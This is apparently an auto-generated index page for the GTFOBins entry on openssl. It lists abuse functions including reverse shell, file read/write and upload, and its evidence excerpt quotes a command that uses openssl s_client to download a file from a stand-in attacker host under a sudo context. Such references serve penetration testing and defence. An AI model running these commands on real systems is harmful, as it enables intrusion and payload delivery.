---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# openssl

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `openssl` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/openssl` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for openssl covering download, file-read, file-write, library-load, reverse-shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/openssl.md)
- Source verification: [source record](../../sources/gtfobins/openssl.md)

## Aliases

- `openssl`

## Source Verification

[source record](../../sources/gtfobins/openssl.md)

## Evidence Excerpt

```text
_body: ''
_name: openssl
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/openssl
functions:
download:
- code: openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file
contexts:
sudo: null
```
